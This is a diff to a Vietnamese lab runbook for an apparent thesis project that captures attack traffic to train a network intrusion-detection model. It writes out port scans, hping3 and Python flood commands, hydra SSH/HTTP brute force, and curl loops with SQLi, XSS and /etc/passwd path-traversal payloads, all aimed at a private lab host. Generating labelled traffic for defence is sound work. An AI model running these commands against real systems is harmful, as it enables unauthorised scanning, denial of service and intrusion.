@@ -26,7 +26,7 @@ Phiên **tấn công** thì **ngược lại**: attacker bắn từ ngoài vào 
                                                                               │  cfm offline
                                                                               ▼  data/live/atk.pcap_Flow.csv (84 cột)
                                                                               │  consolidate_attack.py (lọc Src IP + tách cổng)
-                                                                              ▼  data/analysis/portscan_real.csv + dos_real.csv
+                                                                              ▼  data/analysis/{portscan,dos,brute_force,web_attack}_real.csv
 ```
 
 ---
@@ -94,6 +94,30 @@ grep -E 'attacker_ip|victim_ip' replay_config.json
 # phai la: attacker_ip=192.168.0.106  victim_ip=192.168.0.103  (sua neu khac)
 ```
 
+### 2.5 VICTIM (Windows) — dựng dịch vụ cho **Brute Force** & **Web Attack**
+
+> Chỉ cần nếu thu **đầy đủ 4 lớp**. Victim mặc định chỉ mở `445` (cho DoS) — PortScan không cần dịch vụ. **Brute Force cần cổng 22 (SSH), Web Attack cần cổng 80 (HTTP)**, và phải dựng trên **Windows** (WSL không reachable từ LAN). Mỗi lớp một cổng riêng để **gán nhãn theo cổng**.
+
+**SSH cổng 22 (cho Brute Force)** — bật OpenSSH Server, chạy PowerShell **admin**:
+```powershell
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd; Set-Service -Name sshd -StartupType Automatic
+New-NetFirewallRule -DisplayName "atk-ssh-22" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22
+```
+
+**HTTP cổng 80 (cho Web Attack)** — chạy web server đơn giản (giữ cửa sổ mở suốt phiên):
+```powershell
+New-NetFirewallRule -DisplayName "atk-http-80" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80
+python -m http.server 80            # cổng 80 bận thì dùng 8080 (nhớ đổi cổng Web Attack cho khớp)
+```
+
+**Xác nhận từ máy ATTACKER** (cả 3 cổng phải `open`/có phản hồi):
+```bash
+nmap -sT -Pn -p22,80,445 192.168.0.103
+curl -m3 -o /dev/null -w "http %{http_code}\n" http://192.168.0.103:80
+```
+> Nếu 22/80 vẫn `closed` từ attacker → dịch vụ chưa chạy hoặc firewall chặn; sửa xong mới bắn Brute Force/Web Attack (nếu không hydra/curl bị "refused", không sinh traffic).
+
 ---
 
 ## 3. GIAI ĐOẠN 1 — Bật bắt gói (VICTIM / Windows)
@@ -112,19 +136,32 @@ Chạy **trước** khi tấn công. Lọc đúng traffic attacker để nhãn s
 
 ---
 
-## 4. GIAI ĐOẠN 2 — Phát động tấn công (ATTACKER)
+## 4. GIAI ĐOẠN 2 — Phát động tấn công ĐẦY ĐỦ 4 lớp (ATTACKER)
 
-> Ghi lại **mốc giờ bắt đầu/kết thúc từng loại** nếu muốn gán nhãn theo thời gian. **Hoặc** dùng cách **tách theo cổng đích** (mục 6) — bất biến với đồng hồ, khuyến nghị.
-> **Nguyên tắc:** mỗi loại tấn công đánh vào **cổng đích khác nhau** để tách nhãn dễ (vd DoS chỉ 1 cổng, PortScan trải nhiều cổng).
+Thu đủ **4 lớp tấn công** model V8.5 phân loại (theo `label_map`): **PortScan · DoS · Brute Force · Web Attack**. Mỗi lớp đánh vào **một cổng đích riêng** → gán nhãn theo cổng (mục 6), **không cần canh giờ**.
 
-### 4.1 Biến thể KHÔNG cần root (chạy được ngay)
+| Lớp | Cổng đích | Cần dịch vụ victim (mục 2.5) |
+|---|---|---|
+| PortScan | cả dải 1–65535 | không |
+| DoS | 445 | 445 đã mở |
+| Brute Force | 22 (SSH) | OpenSSH Server |
+| Web Attack | 80 (HTTP) | web server |
+
+> Chạy **lần lượt**, chờ lệnh trước xong mới sang lệnh sau. Thứ tự không quan trọng (tách theo cổng). Đặt `VICTIM=192.168.0.103` một lần.
+
+### 4.1 PortScan (cả dải cổng)
 ```bash
 VICTIM=192.168.0.103
+sudo nmap -sS -T4 -p1-65535 -Pn "$VICTIM"      # SYN scan — giống CIC (cần sudo)
+# không có sudo:  nmap -sT -T4 -p1-65535 -Pn "$VICTIM"
+```
 
-# --- PortScan: TCP connect scan (khong can sudo) ---
-nmap -sT -T4 -p1-2000 -Pn "$VICTIM"
-
-# --- DoS: connection flood 30s vao 1 cong mo (vd 445) ---
+### 4.2 DoS (cổng 445)
+```bash
+sudo hping3 --flood -S -p 445 "$VICTIM"        # SYN flood — chạy ~30s rồi Ctrl-C
+```
+Không có sudo → connection flood không‑root:
+```bash
 python3 - "$VICTIM" <<'PY'
 import socket, sys, time, threading
 host=sys.argv[1]; end=time.time()+30; n=[0]; lock=threading.Lock()
@@ -140,30 +177,35 @@ print(f"[flood] {n[0]} ket noi trong ~30s")
 PY
 ```
 
-### 4.2 Biến thể SYN (giống CIC hơn, CẦN sudo/mật khẩu)
-```bash
-sudo nmap -sS -T4 -p1-65535 -Pn 192.168.0.103          # SYN scan full range
-sudo hping3 --flood -S -p 445 192.168.0.103            # SYN flood — vai chuc giay roi Ctrl-C
-```
-
-### 4.3 (tuỳ chọn) Brute force — khớp lớp "Patator" của CIC
+### 4.3 Brute Force (cổng 22 — cần SSH ở mục 2.5)
 ```bash
 sudo apt install -y hydra
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.103 -t 4
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.103
+seq 1 400 | sed 's/^/pass/' > /tmp/wl.txt                     # wordlist gọn 400 mật khẩu (bounded)
+hydra -l admin -P /tmp/wl.txt -t 4 ssh://"$VICTIM"            # SSH-Patator
+```
+> Dùng wordlist nhỏ để hydra chạy dứt điểm (rockyou 14M sẽ chạy rất lâu). ~400 lần thử đủ tạo mẫu Brute Force.
+
+### 4.4 Web Attack (cổng 80 — cần HTTP ở mục 2.5)
+```bash
+# a) Brute login (HTTP) — nhiều request cổng 80
+hydra -l admin -P /tmp/wl.txt -t 4 "http-get://$VICTIM/"     # bo qua neu server khong doi auth
+# b) Chuỗi payload SQLi/XSS — sinh nhiều flow cổng 80 mang đặc trưng Web Attack
+for i in $(seq 1 400); do
+  curl -s -m2 -o /dev/null "http://$VICTIM/?id=1'%20OR%20'1'='1"          # SQLi
+  curl -s -m2 -o /dev/null "http://$VICTIM/search?q=<script>alert(1)</script>"  # XSS
+  curl -s -m2 -o /dev/null "http://$VICTIM/../../etc/passwd"              # path traversal
+done
 ```
 
-### 4.4 (tuỳ chọn) Tự chấm giờ để gán nhãn theo thời gian
+### 4.5 (tuỳ chọn) Tự chấm giờ — chỉ khi muốn gán nhãn theo thời gian
+> Không cần nếu mỗi lớp đánh 1 cổng riêng (gán theo cổng ở mục 6, bất biến đồng hồ). Chỉ dùng khi **một cổng chạy nhiều loại**.
 ```bash
 PAD=5; MARKS=~/attack_windows.txt; : > "$MARKS"
 atk(){ label="$1"; shift; s=$(date -d "-$PAD sec" '+%Y-%m-%d %H:%M:%S'); "$@";
        e=$(date -d "+$PAD sec" '+%Y-%m-%d %H:%M:%S');
        printf '    ("%s", "%s", "%s"),\n' "$label" "$s" "$e" | tee -a "$MARKS"; }
-# vi du:
-atk PortScan nmap -sT -T4 -p1-2000 -Pn 192.168.0.103
-atk DoS timeout 30 sudo hping3 --flood -S -p 445 192.168.0.103
 ```
-> ⚠️ Giờ trong `attack_windows.txt` theo **đồng hồ máy attacker**; timestamp trong CSV theo **đồng hồ WSL victim**. Hai máy phải **cùng giờ + cùng timezone** (`date '+%F %T %Z'` trên cả hai). Lệch timezone → sửa: `sudo ln -sf /usr/share/zoneinfo/Asia/Ho_Chi_Minh /etc/localtime`. Không muốn lo → dùng tách theo cổng (mục 6).
+> ⚠️ Giờ theo **đồng hồ attacker**; timestamp CSV theo **đồng hồ victim (Windows, nơi dumpcap ghi)**. Hai máy phải cùng giờ + timezone (`date '+%F %T %Z'`). Lệch → dùng tách theo cổng.
 
 ---
 
@@ -194,27 +236,27 @@ ls -1 data/live/*_Flow.csv
 
 Nhãn sạch = **lọc `Src IP == 192.168.0.106`** (chỉ traffic attacker) rồi **tách loại tấn công theo cổng đích** (bất biến đồng hồ).
 
-### 6.1 Cách A — tách theo cổng bằng script có sẵn
-Mở [training/consolidate_attack.py](training/consolidate_attack.py), điền `WINDOWS` (dùng cửa sổ rộng + lọc cổng cho DoS):
+### 6.1 Cách A — script có sẵn (khuyến nghị, gán THUẦN THEO CỔNG)
+[training/consolidate_attack.py](training/consolidate_attack.py) đã cấu hình sẵn `PORT_LABELS` cho phiên 4 lớp — **không cần sửa gì** nếu bạn đánh đúng cổng ở mục 4:
 ```python
-WINDOWS = [
-    ("PortScan", "2026-07-03 00:00:00", "2026-07-04 00:00:00"),        # ca ngay, moi cong
-    ("DoS",      "2026-07-03 00:00:00", "2026-07-04 00:00:00", 445),   # cung khung nhung chi cong 445
-]
+PORT_LABELS = {80: "Web Attack", 22: "Brute Force", 445: "DoS"}   # còn lại -> PortScan
 ```
-> Dòng sau ghi đè dòng trước ở phần trùng → DoS (cổng 445) tách khỏi PortScan. `attacker_ip` script **tự đọc từ `replay_config.json`**.
+Chạy:
 ```bash
 python3 training/consolidate_attack.py
 ```
+Script lọc `Src IP == attacker_ip` (tự đọc từ `replay_config.json`), gán nhãn theo cổng đích, kiểm 84 cột/NaN/inf, xuất `data/analysis/{portscan,dos,brute_force,web_attack}_real.csv`.
+> Cổng ≠ 80/22/445 → PortScan. PortScan lỡ trúng 80/22/445 (mỗi cổng 1 flow) sẽ bị gộp vào lớp tương ứng — không đáng kể.
 
-### 6.2 Cách B — một lệnh tự chứa (không cần sửa file)
+### 6.2 Cách B — một lệnh tự chứa (không cần file script)
 ```bash
 cd "/mnt/d/ĐỒ ÁN/graduation-thesis/live_detection"
 python3 - <<'PY'
 from pathlib import Path
 import numpy as np, pandas as pd, glob, sys
 OUT=Path("data/analysis"); OUT.mkdir(parents=True,exist_ok=True)
-ATTACKER="192.168.0.106"; DOS_PORT=445
+ATTACKER="192.168.0.106"
+PORT_LABELS={80:"Web Attack", 22:"Brute Force", 445:"DoS"}   # con lai -> PortScan
 fs=glob.glob("data/live/*.csv")+glob.glob("data/live/processed/*.csv")
 if not fs: sys.exit("[!] Khong co CSV trong data/live/. Da chay cfm chua?")
 df=pd.concat([pd.read_csv(f,low_memory=False).rename(columns=str.strip) for f in fs],ignore_index=True)
@@ -229,27 +271,30 @@ print(f"[*] Tong {len(df)} flow | tu attacker {ATTACKER}: {len(atk)}")
 if atk.empty:
     print(df[src].astype(str).str.strip().value_counts().head(8)); sys.exit("[!] 0 flow tu attacker.")
 port=pd.to_numeric(atk[dpt],errors="coerce")
-atk["Label"]=np.where(port==DOS_PORT,"DoS","PortScan")
+atk["Label"]=port.map(PORT_LABELS).fillna("PortScan")
+print(atk["Label"].value_counts().to_string())
 n=atk.select_dtypes(include=[np.number])
 print(f"[*] Cot(khong Label)={atk.shape[1]-1} (train=84) | NaN={int(n.isna().sum().sum())} inf={int(np.isinf(n.to_numpy(float,na_value=0)).sum())}")
 for name,g in atk.groupby("Label"):
-    f=OUT/f"{name.lower()}_real.csv"; g.to_csv(f,index=False); print(f"[+] {f.name}: {len(g)} flow")
+    f=OUT/f"{name.lower().replace(' ','_')}_real.csv"; g.to_csv(f,index=False); print(f"[+] {f.name}: {len(g)} flow")
 PY
 ```
 
 ### 6.3 Kiểm kết quả
 ```bash
 ls -lh data/analysis/*_real.csv
-wc -l data/analysis/dos_real.csv data/analysis/portscan_real.csv
+wc -l data/analysis/portscan_real.csv data/analysis/dos_real.csv data/analysis/brute_force_real.csv data/analysis/web_attack_real.csv 2>/dev/null
 ```
 
 ---
 
-## 7. Tiêu chí Done (Phiên 2)
+## 7. Tiêu chí Done (Phiên 2 — đầy đủ 4 lớp)
+- [ ] Mục 2.5: `nmap -p22,80,445` từ attacker thấy **cả 3 cổng open** (nếu thu Brute Force + Web Attack).
 - [ ] `dumpcap` bắt được **>> vài nghìn packet** (không phải ~1k như bắt trong WSL) — kiểm `dir C:\cap` thấy file lớn.
 - [ ] cfm sinh `*_Flow.csv` **84 cột** trong `data/live/`.
-- [ ] `consolidate_attack.py` báo **>0 flow từ 192.168.0.106**.
-- [ ] `data/analysis/<attack>_real.csv` có ít nhất **1–2 loại** nhãn sạch (vd `portscan_real.csv`, `dos_real.csv`).
+- [ ] `consolidate_attack.py` báo **>0 flow từ 192.168.0.106** và in đủ 4 nhãn.
+- [ ] `data/analysis/` có **`portscan_real.csv`, `dos_real.csv`, `brute_force_real.csv`, `web_attack_real.csv`** — nhãn khớp `label_map` model.
+- [ ] Lưu ý cân bằng: DoS/PortScan thường **áp đảo** Brute Force/Web Attack → khi fine-tune nên undersample.
 
 ---
 
